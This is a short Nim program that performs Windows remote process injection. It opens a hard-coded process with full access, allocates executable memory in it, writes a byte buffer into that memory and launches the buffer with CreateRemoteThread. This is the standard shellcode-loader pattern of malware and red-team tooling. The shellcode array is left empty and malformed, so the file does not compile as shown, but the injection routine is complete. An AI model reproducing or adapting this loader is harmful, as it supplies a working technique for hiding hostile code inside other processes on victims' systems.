import winim/lean
import strformat

proc main() =

  let buf: array[296, byte] = [
    byte ]

  let processId: DWORD = 10128

  let pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, processId)
  defer: CloseHandle(pHandle)
  echo fmt"Got a handle on process: {pHandle}"

  let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](buf.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)

  var bytesWritten: SIZE_T
  let wSuccess = WriteProcessMemory(pHandle, rPtr, unsafeAddr buf, cast[SIZE_T](buf.len), addr bytesWritten)
  echo fmt"WriteProcessMemory: {bool(wSuccess)}. Bytes written: {bytesWritten}"

  let tHandle = CreateRemoteThread(pHandle, NULL, 0, cast[LPTHREAD_START_ROUTINE](rPtr), NULL, 0, NULL)
  defer: CloseHandle(tHandle)
  echo fmt"Started buf in thread: {tHandle}"

main()
